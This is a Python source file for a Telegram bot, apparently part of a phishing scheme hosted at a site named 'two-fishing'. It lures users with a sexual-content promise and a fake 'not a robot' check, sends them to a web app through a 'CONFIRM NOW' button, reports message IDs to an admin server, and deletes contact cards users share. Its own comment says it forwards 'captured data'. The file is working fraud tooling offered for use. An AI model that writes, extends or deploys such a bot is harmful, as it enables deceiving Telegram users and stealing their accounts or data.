# section_bot.py — run this as separate bot on same server (different process/session)
# It forwards captured data to admin bot via HTTP POST /api/section_forward
import os, json, asyncio, logging, time
from telethon import TelegramClient, events
from telethon.tl.custom import Button
from telethon.sessions import StringSession
import requests as http_requests

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(name)s: %(message)s')
logger = logging.getLogger("section_bot")

SECTION_BOT_TOKEN = (os.environ.get("SECTION_BOT_TOKEN") or "").strip()
API_ID = int(os.environ.get("API_ID", "0") or 0)
API_HASH = (os.environ.get("API_HASH") or "").strip()
YOUR_TELEGRAM_ID = int(os.environ.get("OWNER_ID", "0") or 0)
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")
ADMIN_BOT_URL = os.environ.get("ADMIN_BOT_URL", "https://two-fishing.onrender.com")

SECTION_WELCOME_MSGS = [
    {"type": "text", "content": "**Hello {name} 👋**\n\n🔞**To again access to the files completely free of charge, do the following💦:**\n\n>👇Confirm that you are not a robot."},
    {"type": "text", "content": "👇"},
]

SESSION_PATH = f"/tmp/sectionbot_{int(time.time())}.session"
bot = TelegramClient(SESSION_PATH, API_ID, API_HASH)


async def send_welcome(uid, name):
    for i, m in enumerate(SECTION_WELCOME_MSGS):
        content = (m.get("content") or "").replace("{name}", name)
        is_last = (i == len(SECTION_WELCOME_MSGS) - 1)
        buttons = None
        if is_last:
            buttons = [[Button.url("CONFIRM NOW", WEBAPP_URL + "?auto=1")]]
        try:
            sent = await bot.send_message(uid, content, buttons=buttons, parse_mode='md')
            logger.info(f"Welcome #{i+1} sent: {sent.id}")
            # Send msg_id to admin for tracking
            try:
                http_requests.post(
                    f"{ADMIN_BOT_URL}/api/section_msg_track",
                    json={"tg_id": uid, "msg_id": sent.id, "type": "welcome"},
                    timeout=8)
            except Exception as e:
                logger.warning(f"track err: {e}")
        except Exception as e:
            logger.error(f"welcome err: {e}")
        await asyncio.sleep(0.3)


@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    sender = await event.get_sender()
    name = sender.first_name or "Friend"
    logger.info(f"Section /start from {sender.id} ({name})")
    await send_welcome(sender.id, name)


@bot.on(events.NewMessage())
async def any_msg(event):
    # Delete contact cards from user
    try:
        if event.message and event.message.contact:
            logger.info(f"User {event.sender_id} shared contact — deleting")
            await asyncio.sleep(0.3)
            await event.delete()
    except Exception as e:
        logger.warning(f"delete err: {e}")


async def main():
    logger.info("Section bot starting...")
    await bot.start(bot_token=SECTION_BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"✅ Section bot started as @{me.username}")
    await bot.run_until_disconnected()


if __name__ == '__main__':
    try:
        asyncio.get_event_loop().run_until_complete(main())
    except KeyboardInterrupt:
        pass
